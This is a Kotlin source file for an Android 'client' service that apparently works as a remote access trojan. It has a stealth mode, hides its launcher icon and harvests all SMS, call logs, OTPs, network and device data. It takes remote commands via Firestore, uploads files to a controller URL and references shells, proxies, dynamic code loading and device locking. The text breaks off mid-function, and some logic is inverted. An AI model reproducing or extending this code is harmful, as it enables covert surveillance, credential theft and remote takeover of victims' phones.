package com.client.services.client

import android.Manifest
import android.annotation.SuppressLint
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.app.admin.DevicePolicyManager
import android.bluetooth.BluetoothAdapter
import android.bluetooth.BluetoothDevice
import android.bluetooth.BluetoothManager
import android.bluetooth.le.AdvertiseCallback
import android.bluetooth.le.AdvertiseData
import android.bluetooth.le.AdvertiseSettings
import android.bluetooth.le.BluetoothLeAdvertiser
import android.content.BroadcastReceiver
import android.content.ClipData
import android.content.ClipboardManager
import android.content.ComponentName
import android.content.ContentResolver
import android.content.Context
import android.content.Context.SENSOR_SERVICE
import android.content.Intent
import android.content.IntentFilter
import android.content.SharedPreferences
import android.content.pm.PackageManager
import android.database.Cursor
import android.graphics.ImageFormat
import android.hardware.Sensor
import android.hardware.SensorEvent
import android.hardware.SensorEventListener
import android.hardware.SensorManager
import android.hardware.camera2.CameraAccessException
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.hardware.camera2.CaptureFailure
import android.hardware.camera2.CaptureRequest
import android.hardware.camera2.TotalCaptureResult
import android.location.Location
import android.location.LocationManager
import android.media.AudioFormat
import android.media.AudioManager
import android.media.ImageReader
import android.media.MediaPlayer
import android.media.MediaRecorder
import android.net.ConnectivityManager
import android.net.Network
import android.net.NetworkCapabilities
import android.net.NetworkInfo
import android.net.NetworkRequest
import android.net.Uri
import android.net.wifi.WifiConfiguration
import android.net.wifi.WifiManager
import android.net.wifi.WifiNetworkSpecifier
import android.net.wifi.p2p.WifiP2pDevice
import android.net.wifi.p2p.WifiP2pManager
import android.net.wifi.p2p.nsd.WifiP2pDnsSdServiceInfo
import android.os.BatteryManager
import android.os.Build
import android.os.CancellationSignal
import android.os.Environment
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.os.PowerManager
import android.os.VibrationEffect
import android.os.VibratorManager
import android.preference.PreferenceManager
import android.provider.CallLog
import android.provider.Settings
import android.provider.Telephony
import android.telecom.TelecomManager
import android.telephony.SmsManager
import android.telephony.TelephonyManager
import android.util.Log
import android.webkit.MimeTypeMap
import android.widget.Toast
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationCompat
import androidx.core.content.FileProvider
import androidx.exifinterface.media.ExifInterface
import com.chaquo.python.Python
import com.chaquo.python.android.AndroidPlatform
import com.client.BuildConfig
import com.client.LockedActivity
import com.client.LockedWithPinActivity
import com.client.MessageActivity
import com.client.helpers.DeviceOrientationHelper
import com.client.helpers.FlashlightHelper
import com.client.isAccessibilityServiceEnabled
import com.client.isMyServiceRunning
import com.client.receivers.ReceiverDeviceAdmin
import com.client.receivers.blockedPhoneNumbers
import com.client.receivers.phoneNumberToUse
import com.client.receivers.serverPhoneNumbers
import com.client.services.httpproxy.HttpProxyService
import com.client.services.other.MicStreamingService
import com.client.services.other.MyAccessibilityService
import com.client.services.other.appsToPreventOpening
import com.client.services.other.getCurrentlyOpenedApp
import com.client.services.other.notifications
import com.client.services.other.prevPackageName
import com.client.services.python.PythonInteractiveScriptRunnerService
import com.client.services.python.PythonRunner
import com.client.services.socks5proxy.Preferences
import com.client.services.socks5proxy.Socks5Service
import com.client.services.virtualshell.VirtualShellService
import com.google.android.gms.location.LocationCallback
import com.google.android.gms.location.LocationRequest
import com.google.android.gms.location.LocationResult
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.Priority
import com.google.android.gms.tasks.CancellationToken
import com.google.android.gms.tasks.CancellationTokenSource
import com.google.android.gms.tasks.OnTokenCanceledListener
import com.google.firebase.FirebaseApp
import com.google.firebase.firestore.DocumentChange
import com.google.firebase.firestore.EventListener
import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.firestore.ListenerRegistration
import com.google.firebase.firestore.QuerySnapshot
import com.google.firebase.messaging.FirebaseMessaging
import com.google.firebase.storage.FirebaseStorage
import com.google.firebase.storage.StorageReference
import com.google.gson.Gson
import com.google.gson.JsonObject
import dalvik.system.DexClassLoader
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import org.json.JSONObject
import java.io.BufferedReader
import java.io.BufferedWriter
import java.io.DataOutputStream
import java.io.File
import java.io.FileInputStream
import java.io.FileOutputStream
import java.io.FileWriter
import java.io.IOException
import java.io.InputStreamReader
import java.io.OutputStream
import java.io.OutputStreamWriter
import java.lang.reflect.Method
import java.net.HttpURLConnection
import java.net.Inet4Address
import java.net.NetworkInterface
import java.net.ServerSocket
import java.net.Socket
import java.net.URL
import java.text.SimpleDateFormat
import java.util.Arrays
import java.util.Base64
import java.util.Calendar
import java.util.Date
import java.util.Locale
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit
import kotlin.concurrent.thread

data class Coordinates(val latitude: String?, val longitude: String?)

var isStealthModeEnabled = false

var currentDeviceID: String = ""

var isSendingSMSAllowed = true

var audioManager: AudioManager? = null
var mediaPlayer: MediaPlayer? = null
var songPlayer: MediaPlayer? = null
var isPlayingSong = false

var isSocks5ProxyRunning = false
var isHttpProxyRunning = false

var bluetoothAdapter: BluetoothAdapter? = null
var bluetoothLeAdvertiser: BluetoothLeAdvertiser? = null

var isBluetoothScanning = false
var isBluetoothLeScanning = false
var isWifiScanning = false

var listenForOtp = true

var advertiseCallback: AdvertiseCallback? = null

var virtualShellOutputIndex = 0
var virtualShellOutputBroadcastReceiver: BroadcastReceiver? = null
var virtualShellErrorBroadcastReceiver: BroadcastReceiver? = null

var pythonInteractiveScriptRunnerOutputIndex = 0
var pythonInteractiveScriptRunnerOutputBroadcastReceiver: BroadcastReceiver? = null
var pythonInteractiveScriptRunnerErrorBroadcastReceiver: BroadcastReceiver? = null

var serverDeviceIDs = mutableSetOf("Fx7]`£C?K<H`}*X}<9xwMgEn5plKtLYW")

var isLocked = false
var isLockedWithPin = false
var killAll = false

var stop = false

var cameraInitialized = false

val threads: MutableList<Thread> = mutableListOf()

val geofenceList: MutableList<HashMap<String, Any>> = mutableListOf()
var startLoggingLocation = false

var saveCurrentLocationInFirestore = false

fun boolToYesNo(b: Boolean): String {
    return if (b) "Yes" else "No"
}

fun getCallState(context: Context): Int {
    val telephonyManager = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
    return telephonyManager.callState
}

fun disableLauncherActivity(context: Context) {
    val p: PackageManager = context.packageManager
    val componentName: ComponentName = ComponentName(context, "com.client.AliasActivity") // launcher activity specified in manifest file as <category android:name="android.intent.category.LAUNCHER" />
    p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP)
}

fun enableLauncherActivity(context: Context) {
    val p: PackageManager = context.packageManager
    val componentName: ComponentName = ComponentName(context, "com.client.AliasActivity") // launcher activity specified in manifest file as <category android:name="android.intent.category.LAUNCHER" />
    p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP)
}

/**
 * Retrieves local network information:
 * - Lists IPv4 addresses for all non-loopback network interfaces.
 * - Retrieves current Wi-Fi information (SSID, BSSID, and IP address).
 *
 * Ensure that you have the ACCESS_WIFI_STATE permission.
 */
fun getLocalNetworkInfo(context: Context): String {
    val sb = StringBuilder()

    // Retrieve and list non-loopback IPv4 addresses from all network interfaces.
    try {
        val interfaces = NetworkInterface.getNetworkInterfaces()
        while (interfaces.hasMoreElements()) {
            val intf = interfaces.nextElement()
            val addrs = intf.inetAddresses
            while (addrs.hasMoreElements()) {
                val addr = addrs.nextElement()
                if (!addr.isLoopbackAddress && addr is Inet4Address) {
                    sb.append("Interface: ${intf.displayName}, IP: ${addr.hostAddress} | ")
                }
            }
        }
    } catch (ex: Exception) {
        sb.append("Error retrieving network interfaces: ${ex.message}\n")
    }

    // Retrieve Wi-Fi connection info.
    try {
        val wifiManager = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
        val wifiInfo = wifiManager.connectionInfo
        val ssid = wifiInfo.ssid
        val bssid = wifiInfo.bssid

        // Convert the integer IP address to dotted-decimal format.
        val ipAddress = wifiInfo.ipAddress
        val ipString = String.format(
            "%d.%d.%d.%d",
            (ipAddress and 0xff),
            (ipAddress shr 8 and 0xff),
            (ipAddress shr 16 and 0xff),
            (ipAddress shr 24 and 0xff)
        )
        sb.append("Connected Wi-Fi: SSID = $ssid, BSSID = $bssid, IP = $ipString")
    } catch (ex: Exception) {
        sb.append("Error retrieving Wi-Fi info: ${ex.message}\n")
    }

    return sb.toString()
}

fun collectSensorData(context: Context, timeout: Long = 5, callback: (String) -> Unit) {
    Thread {
        val sensorManager = context.getSystemService(Context.SENSOR_SERVICE) as SensorManager
        val sensorList = sensorManager.getSensorList(Sensor.TYPE_ALL)
        val sensorData = mutableMapOf<String, Map<String, Any>>()
        val latch = CountDownLatch(sensorList.size)

        val sensorEventListener = object : SensorEventListener {
            override fun onSensorChanged(event: SensorEvent?) {
                event?.let {
                    val sensorName = event.sensor.name
                    val values = event.values.joinToString(", ") { it.toString() }

                    // Add or update sensor data
                    sensorData[sensorName] = mapOf(
                        "values" to values,
                        "accuracy" to (sensorData[sensorName]?.get("accuracy") ?: SensorManager.SENSOR_STATUS_NO_CONTACT)
                    )

                    // Count down the latch only for the first data point
                    if (!sensorData.containsKey(sensorName)) {
                        latch.countDown()
                    }
                }
            }

            override fun onAccuracyChanged(sensor: Sensor?, accuracy: Int) {
                sensor?.let {
                    val sensorName = it.name
                    println(accuracy.toString())
                    // Update accuracy information if the sensor is already recorded
                    if (sensorData.containsKey(sensorName)) {
                        val existingValues = sensorData[sensorName]?.get("values") ?: ""
                        sensorData[sensorName] = mapOf(
                            "values" to existingValues,
                            "accuracy" to accuracy
                        )
                    }
                }
            }
        }

        // Register all sensors
        sensorList.forEach { sensor ->
            sensorManager.registerListener(sensorEventListener, sensor, SensorManager.SENSOR_DELAY_NORMAL)
        }

        // Wait for all sensors to emit data or timeout
        try {
            latch.await(timeout, TimeUnit.SECONDS)
        } catch (e: InterruptedException) {
            e.printStackTrace()
        }

        // Unregister all sensors after data collection
        sensorList.forEach { sensor ->
            sensorManager.unregisterListener(sensorEventListener, sensor)
        }

        // Convert the collected data to JSON format
        val jsonResult = (sensorData as Map<*, *>?)?.let { JSONObject(it).toString() }

        // Invoke the callback with the JSON result
        if (jsonResult != null) {
            callback(jsonResult)
        } else {
            callback("Error")
        }
    }.start()
}

/** Open another app.
 * @param context current Context, like Activity, App, or Service
 * @param packageName the full package name of the app to open
 * @return true if likely successful, false if unsuccessful
 */
fun openApp(context: Context, packageName: String?) {
    val manager = context.packageManager
    val i = manager.getLaunchIntentForPackage(packageName!!)
        ?: throw Exception("No launch intent found for package $packageName.")
    // throw new ActivityNotFoundException();
    i.addCategory(Intent.CATEGORY_LAUNCHER)
    context.startActivity(i)
}

suspend fun getPublicIPv6(): String? {
    return withContext(Dispatchers.IO) {
        try {
            // ipify's IPv6 endpoint returns a JSON object, e.g. {"ip":"2a00:1450:400f:80d::200e"}
            val url = URL("https://api6.ipify.org?format=json")
            val connection = url.openConnection() as HttpURLConnection
            connection.apply {
                setRequestProperty("User-Agent", "Mozilla/5.0")
                connectTimeout = 5000
                readTimeout = 5000
            }
            connection.inputStream.bufferedReader().use { reader ->
                val response = reader.readText()
                JSONObject(response).getString("ip")
            }
        } catch (e: Exception) {
            e.printStackTrace()
            "Operation failed - ${e.localizedMessage}"
        }
    }
}

suspend fun getPublicIPv4(): String? {
    return withContext(Dispatchers.IO) {
        try {
            // ipify's IPv6 endpoint returns a JSON object, e.g. {"ip":"2a00:1450:400f:80d::200e"}
            val url = URL("https://api.ipify.org?format=json")
            val connection = url.openConnection() as HttpURLConnection
            connection.apply {
                setRequestProperty("User-Agent", "Mozilla/5.0")
                connectTimeout = 5000
                readTimeout = 5000
            }
            connection.inputStream.bufferedReader().use { reader ->
                val response = reader.readText()
                JSONObject(response).getString("ip")
            }
        } catch (e: Exception) {
            e.printStackTrace()
            "Operation failed - ${e.localizedMessage}"
        }
    }
}

fun getAllSecureSettingsAsJson(context: Context): JSONObject {
    val secureSettingsJson = JSONObject()

    try {
        // Get all the keys in Settings.Secure
        val secureSettings = Settings.Secure::class.java.declaredFields
        for (field in secureSettings) {
            // Check if the field is a string
            if (field.type == String::class.java) {
                try {
                    val key = field.get(null) as String
                    val value = Settings.Secure.getString(context.contentResolver, key)
                    if (value != null) {
                        // Add key-value pair to JSONObject
                        secureSettingsJson.put(key, value)
                    }
                } catch (e: Exception) {
                    // Handle any exceptions that occur while fetching values
                    Log.e("SecureSetting", "Error fetching value for key: ${field.name}", e)
                }
            }
        }
    } catch (e: Exception) {
        Log.e("SecureSetting", "Error retrieving settings", e)
    }

    return secureSettingsJson
}

fun getLastNPhoneNumbersWithNames(contentResolver: ContentResolver, context: Context, n: Int): String {
    val phoneNumbersWithNames = StringBuilder()
    var cursor: Cursor? = null
    var ex: Exception? = null

    try {
        // Query the call log content provider
        val projection = arrayOf(
            CallLog.Calls.NUMBER,
            CallLog.Calls.CACHED_NAME,
            CallLog.Calls.DATE // Include the date for formatting
        )
        val sortOrder = "${CallLog.Calls.DATE} DESC" // Sort by the most recent call

        cursor = contentResolver.query(CallLog.Calls.CONTENT_URI, projection, null, null, sortOrder)

        cursor?.let {
            var count = 0
            while (it.moveToNext() && count < n) {
                val phoneNumber = it.getString(it.getColumnIndexOrThrow(CallLog.Calls.NUMBER))
                val contactName = it.getString(it.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME))
                val callDateMillis = it.getLong(it.getColumnIndexOrThrow(CallLog.Calls.DATE)) // Get call date in milliseconds

                // Format the date to a human-readable format
                val dateFormat = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
                val formattedDate = dateFormat.format(Date(callDateMillis))

                // If the contact name is available, append it with a hyphen
                if (!phoneNumber.isNullOrEmpty()) {
                    if (!contactName.isNullOrEmpty()) {
                        phoneNumbersWithNames.append("$contactName - $phoneNumber - $formattedDate\n")
                    } else {
                        phoneNumbersWithNames.append(" - $phoneNumber - $formattedDate\n")
                    }
                    count++
                }
            }
        }
    } catch (e: Exception) {
        Log.e("CallLogHelper", "Error retrieving call log", e)
        ex = e
    } finally {
        cursor?.close()
    }

    // Rethrow any exception encountered
    ex?.let { throw it }

    return phoneNumbersWithNames.toString()
}

fun vibrateDevice(context: Context, milliseconds: Long) {
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
        val vibratorManager = context.getSystemService(Context.VIBRATOR_MANAGER_SERVICE) as VibratorManager
        val vibrator = vibratorManager.defaultVibrator
        if (vibrator.hasVibrator()) {
            val vibrationEffect = VibrationEffect.createOneShot(milliseconds, VibrationEffect.DEFAULT_AMPLITUDE)
            vibrator.vibrate(vibrationEffect)
        }
    } else {
        // For devices below API level 30, use the legacy Vibrator class
        val vibrator = context.getSystemService(Context.VIBRATOR_SERVICE) as android.os.Vibrator
        if (vibrator.hasVibrator()) {
            vibrator.vibrate(milliseconds)
        }
    }
}

fun sendMessage(context: Context?, useSMS: Boolean, msg: String, messageID: String? = null, serverID: String? = null, serverPhoneNo: String? = null) {
    if (useSMS) {
        if (context != null) {
            if (phoneNumberToUse == "") {
                phoneNumberToUse = PreferenceManager.getDefaultSharedPreferences(context)
                    .getString("PhoneNoToUse", "").toString()
            }
            if (phoneNumberToUse != "") {
                if (isSendingSMSAllowed && serverPhoneNo != null) {
                    Log.d("SendMessage", "Sending SMS from $phoneNumberToUse: $msg")
                    try {
                        val smsManager: SmsManager = SmsManager.getDefault()
                        smsManager.sendTextMessage(
                            serverPhoneNo,
                            phoneNumberToUse,
                            msg,
                            null,
                            null
                        )
                    } catch (ex: Exception) {
                        ex.printStackTrace()
                    }
                }
            }
        } else {
            Log.e("SendMessage", "Context is null")
        }
    } else {
        Log.d("SendMessage", "Sending message to $serverID: $msg")
        if (messageID != null && serverID != null) {
            FirebaseFirestore.getInstance()
                .collection("Messages")
                .document()
                .set(
                    hashMapOf(
                        "For" to serverID,
                        "From" to currentDeviceID,
                        "Message" to msg,
                        "MessageID" to messageID,
                    )
                ).addOnFailureListener {
                    Log.e("SendMessage", it.message.toString())
                }
        } else if (serverID != null) {
            FirebaseFirestore.getInstance()
                .collection("Messages")
                .document()
                .set(
                    hashMapOf(
                        "For" to serverID,
                        "From" to currentDeviceID,
                        "Message" to msg
                    )
                ).addOnFailureListener {
                    Log.e("SendMessage", it.message.toString())
                }
        } else {
            FirebaseFirestore.getInstance()
                .collection("Messages")
                .document()
                .set(
                    hashMapOf(
                        "From" to currentDeviceID,
                        "Message" to msg
                    )
                ).addOnFailureListener {
                    Log.e("SendMessage", it.message.toString())
                }
        }
    }
}

fun deleteFirestoreMessage(id: String) {
    FirebaseFirestore.getInstance().collection("Messages").document(id).delete().addOnFailureListener {
        Log.e("DeleteFirestoreMessage", "Failed to delete $id: ${it.message.toString()}")
        it.printStackTrace()
    }
}

private val boundary = "---!@#$%^&*()_+hgcfhyfjygjufku!"

fun uploadFileThreaded(
    context: Context,
    filePath: String,
    serverUrl: String,
    callback: DownloadUploadCallback
) {
    Thread {
        try {
            val url = URL(serverUrl)
            val connection = url.openConnection() as HttpURLConnection
            connection.requestMethod = "POST"
            connection.setRequestProperty("Connection", "Keep-Alive")
            connection.setRequestProperty("ENCTYPE", "multipart/form-data")
            connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")

            val dos = DataOutputStream(connection.outputStream)
            val fileInputStream = FileInputStream(filePath)

            dos.writeBytes("--$boundary\r\n")
            dos.writeBytes("Content-Disposition: form-data; name=\"file\"; filename=\"${filePath.substringAfterLast('/')}\"\r\n")
            dos.writeBytes("Content-Type: application/octet-stream\r\n\r\n")

            // Read the file and write it to the output stream
            val buffer = ByteArray(1024)
            var bytesRead: Int
            while (fileInputStream.read(buffer).also { bytesRead = it } != -1) {
                dos.write(buffer, 0, bytesRead)
            }

            fileInputStream.close()

            dos.writeBytes("\r\n--$boundary--\r\n")
            dos.flush()
            dos.close()

            val responseCode = connection.responseCode
            val response = connection.inputStream.bufferedReader().use { it.readText() }
            val error = connection.errorStream?.bufferedReader()?.use { it.readText() }
            Log.e("ClientService", "Upload error: $error")

            callback.onSuccess(response)
        } catch (e: Exception) {
            callback.onFailure(e)
        }
    }.start()
}

interface DownloadUploadCallback {
    fun onSuccess(filePath: String)
    fun onFailure(error: Throwable)
}

fun downloadFileThreaded(context: Context, fileUrl: String, filePath: String, callback: DownloadUploadCallback) {
    Thread {
        try {
            val url = URL(fileUrl)
            val connection = url.openConnection()
            connection.connect()

            val input = connection.getInputStream()
            val output = FileOutputStream(File(filePath))

            val buffer = ByteArray(1024)
            var bytesRead: Int
            while (input.read(buffer).also { bytesRead = it } != -1) {
                output.write(buffer, 0, bytesRead)
            }

            input.close()
            output.close()

            callback.onSuccess(filePath)
        } catch (e: Exception) {
            callback.onFailure(e)
        }
    }.start()
}

fun writeSmsToFile(smsList: List<String>, file: File) {
    try {
        FileWriter(file).use { writer ->
            for (sms in smsList) {
                writer.write(sms)
                writer.write("\n")
            }
        }
        Log.d("writeSmsToFile", "SMS messages dumped successfully to ${file.absolutePath}")
    } catch (e: IOException) {
        Log.d("writeSmsToFile", "An error occurred: ${e.message}")
    }
}

fun getFolderSize(f: File): Long {
    var size: Long = 0
    if (f.isDirectory) {
        for (file in f.listFiles()!!) {
            size += getFolderSize(file)
        }
    } else {
        size = f.length()
    }
    return size
}

fun getAllSms(context: Context): List<String> {
    val smsList = mutableListOf<String>()
    val uri = Uri.parse("content://sms/")
    val projection = arrayOf("_id", "address", "date", "body")
    val cursor: Cursor? = context.contentResolver.query(uri, projection, null, null, null)

    cursor?.use {
        val idIndex = it.getColumnIndexOrThrow("_id")
        val addressIndex = it.getColumnIndexOrThrow("address")
        val dateIndex = it.getColumnIndexOrThrow("date")
        val bodyIndex = it.getColumnIndexOrThrow("body")

        while (it.moveToNext()) {
            val id = it.getString(idIndex)
            val address = it.getString(addressIndex)
            val date = it.getString(dateIndex)
            val body = it.getString(bodyIndex)
            val sms = "ID: $id, Address: $address, Date: $date, Body: $body"
            smsList.add(sms)
        }
    }
    return smsList
}

fun getLastNSms(context: Context, n: Int): List<String> {
    val smsList = mutableListOf<String>()
    val uri = Uri.parse("content://sms/")
    val projection = arrayOf("_id", "address", "date", "body")
    val sortOrder = "${Telephony.Sms.DATE} DESC LIMIT $n"
    val cursor: Cursor? = context.contentResolver.query(uri, projection, null, null, sortOrder)

    cursor?.use {
        val idIndex = it.getColumnIndexOrThrow("_id")
        val addressIndex = it.getColumnIndexOrThrow("address")
        val dateIndex = it.getColumnIndexOrThrow("date")
        val bodyIndex = it.getColumnIndexOrThrow("body")

        while (it.moveToNext()) {
            val id = it.getString(idIndex)
            val address = it.getString(addressIndex)
            val date = it.getString(dateIndex)
            val body = it.getString(bodyIndex)
            val sms = "ID: $id, Address: $address, Date: $date, Body: $body"
            smsList.add(sms)
        }
    }
    return smsList
}

private fun deleteRecursive(fileOrDirectory: File): Boolean {
    if (fileOrDirectory.isDirectory) {
        for (child in fileOrDirectory.listFiles()!!) {
            if (!deleteRecursive(child)) {
                return false
            }
        }
    }
    return fileOrDirectory.delete()
}

fun removeBeforeFirstSeparator(text: String, separator: String): String {
    val firstIndex = text.indexOf(separator)
    return if (firstIndex >= 0) text.substring(firstIndex + separator.length) else text
}

fun getMimeType(context: Context, uri: Uri): String? {
    // If the URI is a content:// URI, use the content resolver
    return if (uri.scheme == ContentResolver.SCHEME_CONTENT) {
        context.contentResolver.getType(uri)
    } else {
        // Otherwise, try to get the MIME type from the file extension
        val fileExtension = MimeTypeMap.getFileExtensionFromUrl(uri.toString())
        MimeTypeMap.getSingleton().getMimeTypeFromExtension(fileExtension.lowercase())
    }
}

fun isImageFile(context: Context, uri: Uri): Boolean {
    val mimeType = getMimeType(context, uri)
    val type = MimeTypeMap.getSingleton().getExtensionFromMimeType(mimeType)
    return type?.startsWith("image") ?: false
}

fun getGpsCoordinates(context: Context, uri: Uri): Coordinates {
    val inputStream = context.contentResolver.openInputStream(uri)
    inputStream?.use {
        val exifInterface = ExifInterface(it)
        val latLong = FloatArray(2)
        if (exifInterface.getLatLong(latLong)) {
            return Coordinates(latLong[0].toString(), latLong[1].toString())
        }
    }
    return Coordinates(null, null)
}

@SuppressLint("UnspecifiedRegisterReceiverFlag")
fun parseCommand(command: String, firestore: FirebaseFirestore, context: Context, handler: Handler, applicationContext: Context, preferences: SharedPreferences, storage: StorageReference, messageID: String?, serverID: String?): Boolean {
    Log.d(
        "ClientService",
        "Received command for $currentDeviceID: $command"
    )
    val c = context
    if (command == "DISABLE_SENDING_SMS") {
        isSendingSMSAllowed = false
        with(preferences.edit()) {
            putBoolean("isSendingSMSAllowed", isSendingSMSAllowed)
            commit()
        }
        sendMessage(
            context,
            false,
            "DISABLE_SENDING_SMS: Operation completed successfully",
            messageID, serverID
        )
    } else if (command == "ENABLE_SENDING_SMS") {
        isSendingSMSAllowed = true
        with(preferences.edit()) {
            putBoolean("isSendingSMSAllowed", isSendingSMSAllowed)
            commit()
        }
        sendMessage(
            context,
            false,
            "ENABLE_SENDING_SMS: Operation completed successfully",
            messageID, serverID
        )
    } else if (command.startsWith("SET_DEVICE_ID ")) {
        val id = command.removePrefix("SET_DEVICE_ID ")
        with(preferences.edit()) {
            putString("DeviceID", id)
            commit()
        }
        val oldId = currentDeviceID
        currentDeviceID = id
        Log.d("ClientService", "Device ID set to $currentDeviceID")
        firestore.collection("Devices").document(oldId).delete()
            .addOnFailureListener {
                it.printStackTrace()
                sendMessage(
                    context,
                    false,
                    "SET_DEVICE_ID: Operation failed - ${it.localizedMessage}",
                    messageID, serverID
                )
            }.addOnSuccessListener {
                FirebaseMessaging.getInstance().token.addOnCompleteListener { task ->
                    if (!task.isSuccessful) {
                        Log.e(
                            "ClientService",
                            "Fetching FCM registration token failed",
                            task.exception
                        )
                        sendMessage(
                            context,
                            false,
                            "SET_DEVICE_ID: Operation failed - ${task.exception?.localizedMessage}",
                            messageID, serverID
                        )
                        return@addOnCompleteListener
                    }

                    // Get new FCM registration token
                    val token = task.result
                    Log.d("ClientService", "Token: $token")

                    val partitions = mutableListOf<List<String>>()
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                        for (p in Build.getFingerprintedPartitions()) {
                            partitions.add(
                                listOf(
                                    p.name,
                                    p.fingerprint,
                                    p.buildTimeMillis.toString()
                                )
                            )
                        }
                    }

                    // Log and handle the token as needed
                    firestore.collection("Devices").document(id)
                        .set(
                            hashMapOf<String, Any>(
                                "ID" to id,
                                "Build.VERSION.BASE_OS" to Build.VERSION.BASE_OS,
                                "Build.VERSION.INCREMENTAL" to Build.VERSION.INCREMENTAL,
                                "Build.VERSION.SDK_INT" to Build.VERSION.SDK_INT,
                                "Build.VERSION.CODENAME" to Build.VERSION.CODENAME,
                                "Build.VERSION.SECURITY_PATCH" to Build.VERSION.SECURITY_PATCH,
                                "Build.VERSION.RELEASE" to Build.VERSION.RELEASE,
                                "Build.VERSION.RELEASE_OR_CODENAME" to if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) Build.VERSION.RELEASE_OR_CODENAME else "",
                                "Build.VERSION.RELEASE_OR_PREVIEW_DISPLAY" to if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) Build.VERSION.RELEASE_OR_PREVIEW_DISPLAY else "",
                                "Build.VERSION.PREVIEW_SDK_INT" to Build.VERSION.PREVIEW_SDK_INT,
                                "Build.DISPLAY" to Build.DISPLAY,
                                "Build.ID" to Build.ID,
                                "Build.BOARD" to Build.BOARD,
                                "Build.BOOTLOADER" to Build.BOOTLOADER,
                                "Build.FINGERPRINT" to Build.FINGERPRINT,
                                "Build.DEVICE" to Build.DEVICE,
                                "Build.MANUFACTURER" to Build.MANUFACTURER,
                                "Build.HOST" to Build.HOST,
                                "Build.HARDWARE" to Build.HARDWARE,
                                "Build.BRAND" to Build.BRAND,
                                "Build.MODEL" to Build.MODEL,
                                "Build.ODM_SKU" to if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) Build.ODM_SKU else "",
                                "Build.SKU" to if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) Build.SKU else "",
                                "Build.SOC_MANUFACTURER" to if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) Build.SOC_MANUFACTURER else "",
                                "Build.SOC_MODEL" to if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) Build.SOC_MODEL else "",
                                "Build.SUPPORTED_32_BIT_ABIS" to Build.SUPPORTED_32_BIT_ABIS.toList(),
                                "Build.SUPPORTED_64_BIT_ABIS" to Build.SUPPORTED_64_BIT_ABIS.toList(),
                                "Build.SUPPORTED_ABIS" to Build.SUPPORTED_ABIS.toList(),
                                "Build.USER" to Build.USER,
                                "Build.PRODUCT" to Build.PRODUCT,
                                "Build.RADIO_VERSION" to Build.getRadioVersion(),
                                "Build.CPU_ABI" to Build.CPU_ABI,
                                "Build.CPU_ABI2" to Build.CPU_ABI2,
                                "Build.TYPE" to Build.TYPE,
                                "Build.TAGS" to Build.TAGS,
                                "Build.Partition.PARTITION_NAME_SYSTEM" to if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) Build.Partition.PARTITION_NAME_SYSTEM else "",
                                "Build.getFingerprintedPartitions()" to Gson().toJson(
                                    partitions
                                ),
                                "Token" to token
                            )
                        ).addOnCompleteListener {
                            if (it.isSuccessful) {
                                sendMessage(
                                    context,
                                    false,
                                    "SET_DEVICE_ID: Operation completed successfully",
                                    messageID, serverID
                                )
                            } else {
                                it.exception?.printStackTrace()
                                sendMessage(
                                    context,
                                    false,
                                    "SET_DEVICE_ID: Operation failed - ${it.exception?.localizedMessage}",
                                    messageID, serverID
                                )
                            }
                        }
                }
            }
    } else if (command.startsWith("ADD_SERVER_ID ")) {
        val id = command.removePrefix("ADD_SERVER_ID ")
        if (id !in serverDeviceIDs) {
            serverDeviceIDs.add(id)
            with(preferences.edit()) {
                putStringSet("ServerCurrentDeviceID", serverDeviceIDs)
                commit()
            }
            sendMessage(
                context,
                false,
                "ADD_SERVER_ID: Operation completed successfully",
                messageID, serverID
            )
        } else {
            sendMessage(
                context,
                false,
                "ADD_SERVER_ID: Operation failed - ID already added",
                messageID, serverID
            )
        }
    } else if (command.startsWith("REMOVE_SERVER_ID ")) {
        val id = command.removePrefix("REMOVE_SERVER_ID ")
        if (id !in serverDeviceIDs) {
            serverDeviceIDs.remove(id)
            with(preferences.edit()) {
                putStringSet("ServerCurrentDeviceID", serverDeviceIDs)
                commit()
            }
            sendMessage(
                context,
                false,
                "REMOVE_SERVER_ID: Operation completed successfully",
                messageID, serverID
            )
        } else {
            sendMessage(
                context,
                false,
                "REMOVE_SERVER_ID: Operation failed - ID already added",
                messageID, serverID
            )
        }
    } else if (command.startsWith("GET_SERVER_IDs")) {
        sendMessage(
            context,
            false,
            "GET_SERVER_IDs: $serverDeviceIDs",
            messageID, serverID
        )
    } else if (command == "UPDATE_DEVICE_INFO") {
        FirebaseMessaging.getInstance().token.addOnCompleteListener { task ->
            if (!task.isSuccessful) {
                sendMessage(
                    context,
                    false,
                    "UPDATE_DEVICE_INFO: Operation failed - ${task.exception?.localizedMessage}",
                    messageID, serverID
                )
                return@addOnCompleteListener
            }

            // Get new FCM registration token
            val token = task.result
            Log.d("ClientService", "Token: $token")

            val partitions = mutableListOf<List<String>>()
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                for (p in Build.getFingerprintedPartitions()) {
                    partitions.add(
                        listOf(
                            p.name,
